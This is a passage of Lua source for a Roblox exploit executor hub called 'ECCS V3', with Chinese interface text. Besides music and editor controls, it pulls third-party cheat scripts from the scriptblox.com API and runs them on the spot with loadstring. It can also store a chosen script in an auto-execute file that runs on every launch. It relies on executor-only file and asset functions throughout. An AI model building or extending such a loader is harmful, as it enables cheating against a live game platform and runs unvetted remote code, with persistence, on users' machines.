VolumeDownButtonBackground.Name = "VolumeDownButtonBackground"
VolumeDownButtonBackground.Parent = MainSondFrame
VolumeDownButtonBackground.AnchorPoint = Vector2.new(0.5, 0.5)
VolumeDownButtonBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
VolumeDownButtonBackground.Position = UDim2.new(0.1, 0, 0.9, 0)
VolumeDownButtonBackground.Size = UDim2.new(0, 50, 0, 35)
 
VolumeDownButtonBackgroundUICorner.CornerRadius = UDim.new(0, 15)
VolumeDownButtonBackgroundUICorner.Parent = VolumeDownButtonBackground
 
VolumeUpButtonBackground.Name = "VolumeUpButtonBackground"
VolumeUpButtonBackground.Parent = MainSondFrame
VolumeUpButtonBackground.AnchorPoint = Vector2.new(0.5, 0.5)
VolumeUpButtonBackground.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
VolumeUpButtonBackground.Position = UDim2.new(0.9, 0, 0.9, 0)
VolumeUpButtonBackground.Size = UDim2.new(0, 50, 0, 35)

VolumeUpButtonBackgroundUICorner.CornerRadius = UDim.new(0, 15)
VolumeUpButtonBackgroundUICorner.Parent = VolumeUpButtonBackground
 
VolumeUpButton.Name = "VolumeUpButton"
VolumeUpButton.Parent = VolumeUpButtonBackground
VolumeUpButton.AnchorPoint = Vector2.new(0.5, 0.5)
VolumeUpButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VolumeUpButton.Position = UDim2.new(0.5, 0, 0.5, 0)
VolumeUpButton.Size = UDim2.new(0, 46, 0, 32)
VolumeUpButton.Image = "rbxassetid://16164520143"
VolumeUpButton.AutoButtonColor = false
 
VolumeUpButtonUICorner.CornerRadius = UDim.new(0, 12)
VolumeUpButtonUICorner.Parent = VolumeUpButton
 
VolumeDownButton.Name = "VolumeDownButton"
VolumeDownButton.Parent = VolumeDownButtonBackground
VolumeDownButton.AnchorPoint = Vector2.new(0.5, 0.5)
VolumeDownButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VolumeDownButton.Position = UDim2.new(0.5, 0, 0.5, 0)
VolumeDownButton.Size = UDim2.new(0, 46, 0, 32)
VolumeDownButton.Image = "rbxassetid://16164522333"
VolumeDownButton.AutoButtonColor = false
 
VolumeDownButtonUICorner.CornerRadius = UDim.new(0, 12)
VolumeDownButtonUICorner.Parent = VolumeDownButton
 
VolumeDownButton_2.Name = "VolumeDownButton_2"
VolumeDownButton_2.Parent = VolumeDownButtonBackground
VolumeDownButton_2.AnchorPoint = Vector2.new(0.5, 0.5)
VolumeDownButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VolumeDownButton_2.Position = UDim2.new(0.5, 0, 0.5, 0)
VolumeDownButton_2.Size = UDim2.new(0, 46, 0, 32)
VolumeDownButton_2.Image = "rbxassetid://16164522333"
VolumeDownButton_2.AutoButtonColor = false
 
VolumeDownButtonUICorner_2.CornerRadius = UDim.new(0, 12)
VolumeDownButtonUICorner_2.Parent = VolumeDownButton_2
 
VolumeUpButton_2.Name = "VolumeUpButton_2"
VolumeUpButton_2.Parent = VolumeUpButtonBackground
VolumeUpButton_2.AnchorPoint = Vector2.new(0.5, 0.5)
VolumeUpButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VolumeUpButton_2.Position = UDim2.new(0.5, 0, 0.5, 0)
VolumeUpButton_2.Size = UDim2.new(0, 46, 0, 32)
VolumeUpButton_2.Image = "rbxassetid://16164520143"
VolumeUpButton_2.AutoButtonColor = false
 
VolumeUpButtonUICorner_2.CornerRadius = UDim.new(0, 12)
VolumeUpButtonUICorner_2.Parent = VolumeUpButton_2
 
VolumeDownButton_2.Visible = false
VolumeUpButton_2.Visible = false
 
VolumeFrame.Name = "VolumeFrame"
VolumeFrame.Parent = MainSondFrame
VolumeFrame.Position = UDim2.new(0.2, 0, 0.895, 0)
VolumeFrame.Size = UDim2.new(0, 10, 0, 5)
VolumeFrame.BackgroundColor3 = Color3.new(255, 255, 255)
 
VolumeFrameUICorner.CornerRadius = UDim.new(1, 0)
VolumeFrameUICorner.Parent = VolumeFrame
 
 
function setHoverDef(from, to, obj)
    from = from or obj.Size
    
    obj.MouseEnter:Connect(function()
 
        TweenService:Create(obj, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
            Size = to
}):Play()
 
    end)
    
    obj.MouseLeave:Connect(function()
 
        TweenService:Create(obj, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
            Size = from
 }):Play()
 
    end)
end
 
setHoverDef(nil, UDim2.new(0, 40, 0, 40), HomeButton)
setHoverDef(nil, UDim2.new(0, 40, 0, 40), SearcherOpenUIButton)
setHoverDef(nil, UDim2.new(0, 40, 0, 40), ConsoleButton)
setHoverDef(nil, UDim2.new(0, 40, 0, 40), EditorButton)
setHoverDef(nil, UDim2.new(0, 36, 0, 36), MusicButton) 

function createfolders(path)
 local pathtbl = string.split(path, "/")
 for i, v in pairs(pathtbl) do
  if i == 1 then
   if not isfolder(v) then
    makefolder(v)
   end
  else
   local newpath = pathtbl[1]
   for i2=2, i-1 do
    newpath = newpath.. "/" ..pathtbl[i2]
   end
   newpath = newpath.. "/" ..v
   if not isfolder(newpath) then
    makefolder(newpath)
   end
  end
 end
end
 
if not isfolder("ECCS_V3") then
createfolders("ECCS_V3/CoreSystem/Files")
end
 
if not isfile("ECCS_V3/CoreSystem/Files/ECCSV3EDITOR.ECCS") then
writefile("ECCS_V3/CoreSystem/Files/ECCSV3EDITOR.ECCS", ""..EditorTextBox.Text)
end
 
if not isfile("ECCS_V3/CoreSystem/Files/AUTOEXECUTE.ECCS") then
writefile("ECCS_V3/CoreSystem/Files/AUTOEXECUTE.ECCS", " ")
end

if not isfile("ECCS_V3/CoreSystem/Files/ECCSV3Player.ECCS") then
writefile("ECCS_V3/CoreSystem/Files/ECCSV3Player.ECCS", " ")
end

if not isfile("ECCS_V3/CoreSystem/Files/ECCSV3SearchHistory.ECCS") then
writefile("ECCS_V3/CoreSystem/Files/ECCSV3SearchHistory.ECCS", "")
end

local ReadAE = readfile("ECCS_V3/CoreSystem/Files/AUTOEXECUTE.ECCS")
spawn(function()
loadstring(ReadAE)()
end)

local ReadECCSV3 = readfile("ECCS_V3/CoreSystem/Files/ECCSV3EDITOR.ECCS")
EditorTextBox.Text = ""..ReadECCSV3

ExecuteButton_3.MouseButton1Click:Connect(function()
loadstring(EditorTextBox.Text)()
end)
 
CopyButton.MouseButton1Click:Connect(function()
setclipboard(EditorTextBox.Text)
end)
 
EditorTextBox.FocusLost:Connect(function(enterPressed)
if enterPressed then
HoverButtons:Play()
loadstring(EditorTextBox.Text)()
end
end)

SaveButton.MouseButton1Click:Connect(function()
writefile("ECCS_V3/CoreSystem/Files/ECCSV3EDITOR.ECCS", ""..EditorTextBox.Text)
end)
 
ClearButton.MouseButton1Click:Connect(function()
EditorTextBox.Text = ""
end)
 
function setHoverColor(Out, to2, obj2)
    Out = Out or obj2.BackgroundColor3
    
    obj2.MouseEnter:Connect(function()
 
        TweenService:Create(obj2, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
            BackgroundColor3 = to2
}):Play()
 end)
    
    obj2.MouseLeave:Connect(function()
 
        TweenService:Create(obj2, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
            BackgroundColor3 = Out
 }):Play()
 end)
end
 
function setHoverColor_2(Out2, to3, obj3)
    Out2 = Out2 or obj3.BackgroundColor3
    
    obj3.MouseEnter:Connect(function()
 
        TweenService:Create(obj3, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
            BackgroundColor3 = to3
}):Play()
 
    end)
    
    obj3.MouseLeave:Connect(function()
 
        TweenService:Create(obj3, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
            BackgroundColor3 = Out2
 }):Play()
 
    end)
end

setHoverColor(nil, Color3.fromRGB(200, 200, 200), CoreSystemFrameBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), MessageBackgroundFrame)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), GameFrameBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), PlayerIconBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), BackgroundConsole)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), ExecuteButtonBackground_3)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), ClearButtonBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), SaveButtonBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), CopyButtonBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), EditorBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), SondFrameBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), Stop_PlayButtonBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), SaveButtonBackground_2)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), PlaylistButtonBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), VolumeDownButtonBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), VolumeUpButtonBackground)
setHoverColor_2(nil, Color3.fromRGB(200, 200, 200), ReloadBackgroundButton)
setHoverColor_2(nil, Color3.fromRGB(200, 200, 200), HistoryBackgroundButton)
setHoverColor_2(nil, Color3.fromRGB(200, 200, 200), ClearAndSearchBackground)
setHoverColor_2(nil, Color3.fromRGB(200, 200, 200), ClearButton_2Background)
setHoverColor_2(nil, Color3.fromRGB(200, 200, 200), CloseCommentsButtonBackground)

Stop_PlayButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)

ClearAndSearchBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
SaveButtonBackground_2.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
PlaylistButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
VolumeDownButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
VolumeUpButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
GameFrameBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
PlayerIconBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
game:GetService("LogService").MessageOut:Connect(
function(Message)
    repeat
        wait()
    until Message
    logTable[#logTable + 1] = Message
    ConsoleOutput.Text = (table.concat(logTable, "\n"))
    for i, v in pairs(logTable) do
        if i == 30 then
            table.remove(logTable, 1)
        end
    end
end
)

function setHoverSysSize(Out2, to23, obj23)
    Out2 = Out2 or obj23.Size
    
    obj23.MouseEnter:Connect(function()
 
        TweenService:Create(obj23, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
            Size = to23
}):Play()
 
    end)
    
    obj23.MouseLeave:Connect(function()
 
        TweenService:Create(obj23, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
            Size = Out2
 }):Play()
 
    end)
end
 
setHoverSysSize(nil, UDim2.new(0, 303, 0, 63), MessageBackgroundFrame)
setHoverSysSize(nil, UDim2.new(0, 55.7, 0, 225), CoreSystemFrameBackground)
 
 
 
local getfakeasset = getcustomasset or getsynasset
 
HttpService = game:GetService("HttpService")
TweenService = game:GetService("TweenService")
 
 
 
local page = 1
local gquery = ""
 
function tableConcat(t1,t2)
    for i, v in pairs(t2) do
        table.insert(t1, v)
    end
    return t1
end

ScriptListFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScriptListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.InfoBox.Comments.Inner.Comments.AutomaticCanvasSize = Enum.AutomaticSize.Y
MainFrame.InfoBox.Comments.Inner.Comments.ScrollBarImageColor3 = Color3.new(0, 0, 0)
MainFrame.InfoBox.Comments.Inner.Comments.ScrollBarImageTransparency = 1
 
VerifiedScript = VerifiedScriptFrame:Clone()
Script = ScriptFrame:Clone()
ScriptFrame:Destroy()
VerifiedScriptFrame:Destroy()
Comment = MainFrame.InfoBox.Comments.Inner.Comments.Comment:Clone()
MainFrame.InfoBox.Comments.Inner.Comments.Comment:Destroy()
 
 
function _if(a, b, c)
    if a then return b else return c end
end
 
function fastmodeExec(func)
    if getgenv().fastmode == true then
        task.spawn(func)
    else
        func()
    end
end
 
function fetchScripts(query, page)
    page = page or 1
    query = HttpService:UrlEncode(query)
    
    local url = _if(query == "", "https://www.scriptblox.com/api/script/fetch?page="..tostring(page), "https://scriptblox.com/api/script/search?q="..query.."&max=100&mode=free&page=".. tostring(page))
    local req = HttpService:JSONDecode(game:HttpGetAsync(url)).result
    
    return req.scripts
end
 
function fetchComments(scriptId, page)
 page = page or 1 
 
 url = "https://scriptblox.com/api/comment/" ..scriptId.. "?page=" ..tostring(page).. "&max=100"
 req = HttpService:JSONDecode(game:HttpGetAsync(url)).result
 
 return req.comments
end

function fixScript(scriptObj)
 
            local req = HttpService:JSONDecode(game:HttpGetAsync("https://www.scriptblox.com/api/script/".. scriptObj.slug)).script
            scriptObj["script"] = _if(scriptObj["script"], scriptObj["script"], req.script)
            scriptObj["features"] = _if(scriptObj["features"], scriptObj["features"], req.features)
            scriptObj["owner"] = _if(scriptObj["owner"], scriptObj["owner"], req.owner)
            
  
    return scriptObj
end
 
 function updateInfoBox(scriptObj)
 scriptObj = fixScript(scriptObj)
 
 
 commentsUIListLayout = MainFrame.InfoBox.Comments.Inner.Comments.UIListLayout:Clone()
 MainFrame.InfoBox.Comments.Inner.Comments:ClearAllChildren()
 commentsUIListLayout.Parent = MainFrame.InfoBox.Comments.Inner.Comments
 
 task.spawn(function()
  for _, v in pairs(fetchComments(scriptObj["_id"])) do
 
   newComment = Comment:Clone()
   newComment.Parent = MainFrame.InfoBox.Comments.Inner.Comments
   newComment.Content.Text = v.text
   newComment.Author.Text = v.commentBy.username
   newComment.LikeCount.Text = v.likeCount
   newComment.DislikeCount.Text = v.dislikeCount
if Content.Visible == true then
NoComments.Visible = false
end
  end
 end)
end
 
function refreshScripts(scriptTbl)
    if #scriptTbl <= 0 then
        SearchBox.Text = ""
        SearchBox.PlaceholderText = "没有找到脚本"
        wait(1)
        SearchBox.PlaceholderText = "点击搜索"
        return
    else
        SearchBox.PlaceholderText = "点击搜索"
    end
    
    local UIGridLayoutCopy = UIGridLayout:Clone()
    Scripts:ClearAllChildren()
    UIGridLayoutCopy.Parent = Scripts
    
    addScripts(scriptTbl)
end
 
function addScripts(scriptTbl)
    for i, v in pairs(scriptTbl) do
        fastmodeExec(function()
            local newScript
 
            v = fixScript(v)
 
            if v.verified == true then
                newScript = VerifiedScript:Clone()
                newScript.ScriptTitle.Text = v.title
                newScript.ScriptAuthor.Text = "by ".. v.owner.username
                newScript.ScriptGame.Text = v.game.name
                newScript.Parent = Scripts
            else
                newScript = Script:Clone()
                newScript.ScriptTitle.Text = v.title
                newScript.ScriptAuthor.Text = "by ".. v.owner.username
                newScript.ScriptGame.Text = v.game.name
                newScript.Parent = Scripts
            end
 
            newScript.ExecuteButton.MouseButton1Click:Connect(function()
 
                loadstring(v.script)()
            end)
 
            newScript.CopyLinkButton.MouseButton1Click:Connect(function()
            setclipboard("https://scriptblox.com/script/".. v.slug)
end)
 
newScript.AutoExecute.MouseButton1Click:Connect(function()
    local ReadAE = readfile("ECCS_V3/CoreSystem/Files/AUTOEXECUTE.ECCS")
    if ReadAE ~= v.script then
        writefile("ECCS_V3/CoreSystem/Files/AUTOEXECUTE.ECCS", v.script)
        MessageFrame.Text = "脚本已保存"
        TextLabel1.Text = "脚本已添加到自动执行"
        MessageBackgroundFrame:TweenPosition(UDim2.new(0.5, 0, 0.9, 0),"InOut","Sine",0.8)
    else
        if ReadAE == v.script then
            writefile("ECCS_V3/CoreSystem/Files/AUTOEXECUTE.ECCS", " ")
            MessageFrame.Text = "脚本已删除"
            TextLabel1.Text = "脚本已从自动执行中删除"
            MessageBackgroundFrame:TweenPosition(UDim2.new(0.5, 0, 0.9, 0),"InOut","Sine",0.8)
        end
    end
end)


setHoverColor(nil, Color3.fromRGB(200, 200, 200), newScript.ExecuteButtonBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), newScript.CopyLinkButtonBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), newScript.CopyScriptBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), newScript.OpenDescriptionBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), newScript.AutoExecuteBackground)
setHoverColor(nil, Color3.fromRGB(200, 200, 200), newScript.CommentsBackground)

newScript.AutoExecuteBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)

newScript.CommentsBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)

newScript.ExecuteButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
newScript.CopyLinkButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
newScript.CopyScriptBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
newScript.OpenDescriptionBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
newScript.CopyScriptButton.MouseButton1Click:Connect(function()
setclipboard(v.script)
end)
 
newScript.OpenDescriptionButton.MouseButton1Click:Connect(function()
DescriptionScript.Visible = true
DescriptionScript.Text = v.features
ScriptListFrame.Visible = false
end)

newScript.CommentsButton.MouseButton1Click:Connect(function()
updateInfoBox(v)
ScriptListFrame.Visible = false
InfoBox.Visible = true
NoComments.Visible = true
end)
 
end)
end
 
    
    pagefetchrunning = false
end
CloseCommentsButton.MouseButton1Click:Connect(function()
InfoBox.Visible = false
ScriptListFrame.Visible = true
CloseDescriptionSound:Play()
end)
DescriptionScript.MouseButton1Click:Connect(function()
DescriptionScript.Visible = false
ScriptListFrame.Visible = true
CloseDescriptionSound:Play()
end)
 
BackgroundConsole.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
 
ExecuteButtonBackground_3.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
ExecuteButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
ClearButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
SaveButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
 
CopyButtonBackground.MouseEnter:Connect(function()
HoverButtons:Play()
end)
 
 
SearchBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
InfoBox.Visible = false
DescriptionScript.Visible = false
ScriptListFrame.Visible = true
        gquery = SearchBox.Text
        page = 1
        local scriptsTbl = fetchScripts(SearchBox.Text, 1)
        refreshScripts(scriptsTbl)
   writefile("ECCS_V3/CoreSystem/Files/ECCSV3SearchHistory.ECCS", ""..SearchBox.Text)
    end
end)

ReloadButton.MouseButton1Click:Connect(function()
InfoBox.Visible = false
DescriptionScript.Visible = false
ScriptListFrame.Visible = true
        gquery = SearchBox.Text
        page = 1
        local scriptsTbl = fetchScripts(SearchBox.Text, 1)
        refreshScripts(scriptsTbl)
end)

ReloadButton.MouseEnter:Connect(function()
  HoverButtons:Play()
 end)
HistoryButton.MouseEnter:Connect(function()
  HoverButtons:Play()
 end)

ClearButton_2.MouseButton1Click:Connect(function()
    ConsoleOutput.Text = "通知、警告和脚本错误将显示在这里，以简化处理。"
end)

ClearButton_2.MouseEnter:Connect(function()
  HoverButtons:Play()
 end)

HistoryButton.MouseButton1Click:Connect(function()
InfoBox.Visible = false
local ReadECCSV3History = readfile("ECCS_V3/CoreSystem/Files/ECCSV3SearchHistory.ECCS")
SearchBox.Text = ""..ReadECCSV3History
DescriptionScript.Visible = false
ScriptListFrame.Visible = true
        gquery = SearchBox.Text
        page = 1
        local scriptsTbl = fetchScripts(SearchBox.Text, 1)
        refreshScripts(scriptsTbl)
end)

SearchBox.FocusLost:Connect(function(enterPressed)
if enterPressed then
HoverButtons:Play()
end
end)
 
 
VolumeUpButton.MouseButton1Click:Connect(function()
Volume = Volume + 0.5
end)
 
VolumeDownButton.MouseButton1Click:Connect(function()
Volume = Volume - 0.5
end)

SaveButton_2.MouseButton1Click:Connect(function()
    if Stop_PlayButton.Image == "rbxassetid://16139639068" and SoundTextBox.Text == "" then
        SoundTextBox.PlaceholderText = "请输入Id"
        wait(1)
        SoundTextBox.PlaceholderText = "声音Id在这里"
    else
        SoundTextBox.PlaceholderText = "声音Id在这里"
        if SaveButton_2.Image == "rbxassetid://16139574980" then
            SaveButton_2.Image = "rbxassetid://16139703752"
            writefile("ECCS_V3/CoreSystem/Files/ECCSV3Player.ECCS", ""..SoundTextBox.Text)
        else
            if SaveButton_2.Image == "rbxassetid://16139703752" then
                SaveButton_2.Image = "rbxassetid://16139574980"
                writefile("ECCS_V3/CoreSystem/Files/ECCSV3Player.ECCS", " ")
            end
        end
    end
end)
 
PlaylistButton.MouseButton1Click:Connect(function()
local ReadECCSV3_2 = readfile("ECCS_V3/CoreSystem/Files/ECCSV3Player.ECCS")
SoundTextBox.Text = ReadECCSV3_2
if SoundTextBox.Text == " " then
SoundTextBox.Text = ""
end
end)
 
ClearAndSearch.MouseButton1Click:Connect(function()
SearchBox.Text = ""
SearchBox:CaptureFocus()
end)

Stop_PlayButton.MouseButton1Click:Connect(function()
    if Stop_PlayButton.Image == "rbxassetid://16139639068" and SoundTextBox.Text == "" then
        SoundTextBox.PlaceholderText = "请输入Id"
        wait(1)
        SoundTextBox.PlaceholderText = "请输入声音Id"
    else
        SoundTextBox.PlaceholderText = "请输入声音Id"
        if Stop_PlayButton.Image == "rbxassetid://16139639068" then
            Stop_PlayButton.Image = "rbxassetid://16139637058"
            Stop_PlayButton.Position = UDim2.new(0.5, 0, 0.5, 0)
            Audio = game:GetService("MarketplaceService"):GetProductInfo(SoundTextBox.Text)
            AudioName.Text = Audio.Name
            CoreSound.SoundId = "rbxassetid://"..SoundTextBox.Text
            CoreSound:Play()
        else
            if Stop_PlayButton.Image == "rbxassetid://16139637058" then
                Stop_PlayButton.Image = "rbxassetid://16139639068"
                Stop_PlayButton.Position = UDim2.new(0.6, 0, 0.5, 0)
                CoreSound:Stop()
            end
        end
    end
end)
 
SoundTextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        if Stop_PlayButton.Image == "rbxassetid://16139639068" and SoundTextBox.Text == "" then
            SoundTextBox.PlaceholderText = "在这里输入Id"
            wait(1)
            SoundTextBox.PlaceholderText = "在这里输入声音Id"
        else
            SoundTextBox.PlaceholderText = "在这里输入声音Id"
            if Stop_PlayButton.Image == "rbxassetid://16139637058" then
                Stop_PlayButton.Image = "rbxassetid://16139639068"
                Stop_PlayButton.Position = UDim2.new(0.5, 0, 0.5, 0)
                Audio = game:GetService("MarketplaceService"):GetProductInfo(SoundTextBox.Text)
                AudioName.Text = Audio.Name
                CoreSound.SoundId = "rbxassetid://"..SoundTextBox.Text
                CoreSound:Play()
            else
                if Stop_PlayButton.Image == "rbxassetid://16139637058" then
                    Stop_PlayButton.Image = "rbxassetid://16139639068"
                    Stop_PlayButton.Position = UDim2.new(0.6, 0, 0.5, 0)
                    CoreSound:Stop()
                end
            end
        end
    end
end)
 
spawn(function()
repeat
wait()
local ReadECCSV3_2 = readfile("ECCS_V3/CoreSystem/Files/ECCSV3Player.ECCS")
if SoundTextBox.Text == ReadECCSV3_2 then
SaveButton_2.Image = "rbxassetid://16139703752"
else
if SoundTextBox.Text ~= ReadECCSV3_2 then
SaveButton_2.Image = "rbxassetid://16139574980"
end
if SoundTextBox.Text == "" then
SaveButton_2.Image = "rbxassetid://16139574980"
Stop_PlayButton.Image = "rbxassetid://16139639068"
Stop_PlayButton.Position = UDim2.new(0.6, 0, 0.5, 0)
CoreSound:Stop()
AudioName.Text = ""
end
end
until 
SaveButton_2 == nil
end)
 
spawn(function()
repeat
wait()
CoreSound.Volume = Volume
if Volume == 0 then
VolumeFrame:TweenSize(UDim2.new(0, 0, 0, 5), "Out", "Linear", 0.5)
VolumeUpButton.Visible = true
VolumeDownButton.Visible = false
VolumeDownButton_2.Visible = true
VolumeUpButton_2.Visible = false
else
if Volume == 0.5 then
VolumeFrame:TweenSize(UDim2.new(0, 55, 0, 5), "Out", "Linear", 0.5)
VolumeUpButton.Visible = true
VolumeDownButton.Visible = true
VolumeDownButton_2.Visible = false
VolumeUpButton_2.Visible = false
else
if Volume == 1 then
VolumeFrame:TweenSize(UDim2.new(0, 105, 0, 5), "Out", "Linear", 0.5)
VolumeUpButton.Visible = true
VolumeDownButton.Visible = true
VolumeDownButton_2.Visible = false
VolumeUpButton_2.Visible = false
else
if Volume == 1.5 then
VolumeFrame:TweenSize(UDim2.new(0, 155, 0, 5), "Out", "Linear", 0.5)
VolumeUpButton.Visible = true
VolumeDownButton.Visible = true
VolumeDownButton_2.Visible = false
VolumeUpButton_2.Visible = false
else
if Volume == 2 then
VolumeFrame:TweenSize(UDim2.new(0, 205, 0, 5), "Out", "Linear", 0.5)
VolumeUpButton.Visible = false
VolumeDownButton.Visible = true
VolumeUpButton_2.Visible = true
VolumeDownButton_2.Visible = false
end
end
end
end
end
until 
SaveButton_2 == nil
end)
 
refreshScripts(fetchScripts(gquery, 1))
 
ScriptListFrame:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
    if (ScriptListFrame.CanvasPosition.Y + ScriptListFrame.AbsoluteSize.Y) >= ScriptListFrame.AbsoluteCanvasSize.Y -200 and not pagefetchrunning then
        page = page + 1
        pagefetchrunning = true
        addScripts(fetchScripts(gquery, page))
    end
end)
PlayerIcon.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=".. game.Players.LocalPlayer.UserId .."&width=999&height=999&format=png"
WelcomeLabel.Text = "欢迎回家，"..game.Players.LocalPlayer.DisplayName
MessageFrame.Text = "已成功加载"
TextLabel1.Text = "欢迎来到ECCS V3，"..game.Players.LocalPlayer.DisplayName
MessageBackgroundFrame:TweenPosition(UDim2.new(0.5, 0, 0.9, 0),"InOut","Sine",0.8)
StartUpSound:Play()           
        end)
        userInputService.InputBegan:Disconnect(onKeyActivated)
    end
end
userInputService.InputBegan:Connect(onKeyActivated)

Library.Icons = { -- 图片/常用图片
    ["手"] = "rbxassetid://7733955740",     ["家"] = "rbxassetid://7733960981",
    ["锚"] = "rbxassetid://7733911490",      ["票"] = "rbxassetid://7734086558",
	["列"] = "rbxassetid://7733757178",      ["秤"] = "rbxassetid://7734052454",
	["伞"] = "rbxassetid://7743874820",     ["云"] = "rbxassetid://7733746980",
	["风"] = "rbxassetid://7743878264",     ["雾"] = "rbxassetid://7733955969",
	["CD"] = "rbxassetid://7734110220",     ["CPU"] = "rbxassetid://7733765045",
	["锤子"] = "rbxassetid://7733955511",	["历史"] = "rbxassetid://7733960880",
	["叉号"] = "rbxassetid://7743878857",	["用户"] = "rbxassetid://7743875962",
	["幼苗"] = "rbxassetid://7743872071",	["移动"] = "rbxassetid://7743870731",
	["槌子"] = "rbxassetid://7733800044",	["鸡腿"] = "rbxassetid://8997385789",
	["快进"] = "rbxassetid://7733799371",	["水滴"] = "rbxassetid://7733770982",
	["钥匙"] = "rbxassetid://7733965118",	["电力"] = "rbxassetid://7733771628",
	["加号"] = "rbxassetid://7734042071",	["吸管"] = "rbxassetid://7743871384",
	["扫描"] = "rbxassetid://8997386861",	["RSS"] = "rbxassetid://7734052075",
	["活动"] = "rbxassetid://7733655755",	["网格"] = "rbxassetid://7733955179",
	["菜单"] = "rbxassetid://7733993211",	["地标"] = "rbxassetid://7733965184",
	["钱包"] = "rbxassetid://7743877573",	["布局"] = "rbxassetid://7733970543",
	["欧元"] = "rbxassetid://7733771891",	["图片"] = "rbxassetid://7733964126",
	["缩进"] = "rbxassetid://7733964452",   ["井号"] = "rbxassetid://7733955906",
	["光圈"] = "rbxassetid://7733666258",	["表格"] = "rbxassetid://7743871876",
	["电视"] = "rbxassetid://7743874674",	["耳机"] = "rbxassetid://7733956063",
	["回复"] = "rbxassetid://7734051594",	["来电"] = "rbxassetid://7743871120",
	["倒带"] = "rbxassetid://7734051670",	["引用"] = "rbxassetid://7734045100",
	["保存"] = "rbxassetid://7734052335",	["等于"] = "rbxassetid://7733771811",
	["相机"] = "rbxassetid://7733708692",	["卡车"] = "rbxassetid://7743874482",
	["解锁"] = "rbxassetid://7743875263",	["网络"] = "rbxassetid://7734021047",
	["用户"] = "rbxassetid://7743876054",	["书籍"] = "rbxassetid://7733914390",
	["放大"] = "rbxassetid://7743878977",	["目标"] = "rbxassetid://7743872758",
	["快退"] = "rbxassetid://7734058404",	["投射"] = "rbxassetid://7733919326",
	["电话"] = "rbxassetid://7734032056",	["类型"] = "rbxassetid://7743874740",
	["虫子"] = "rbxassetid://7733701545",	["鸡蛋"] = "rbxassetid://8997385940",
	["皇冠"] = "rbxassetid://7733765398",	["金币"] = "rbxassetid://7743866529",
	["电池"] = "rbxassetid://7733674820",	["雪山"] = "rbxassetid://7743870286",
	["礼物"] = "rbxassetid://7733946818",	["选项"] = "rbxassetid://7734021300",
	["图钉"] = "rbxassetid://8997386648",	["铅笔"] = "rbxassetid://7734022107",
	["云雾"] = "rbxassetid://7733920317",	["检查"] = "rbxassetid://7733964808",
	["框架"] = "rbxassetid://7733799486",	["货币"] = "rbxassetid://7733765592",
	["星星"] = "rbxassetid://7734068321",	["微笑"] = "rbxassetid://7734059095",
	["下标"] = "rbxassetid://8997387937",	["太阳"] = "rbxassetid://7734068495",
	["表格"] = "rbxassetid://7734073253",	["标签"] = "rbxassetid://7734075797",
	["叉号"] = "rbxassetid://7733765224",	["宝石"] = "rbxassetid://7733942651",
	["终端"] = "rbxassetid://7743872929",	["灯泡"] = "rbxassetid://7733975185",
	["缩小"] = "rbxassetid://7734056971",	["邮件"] = "rbxassetid://7733992732",
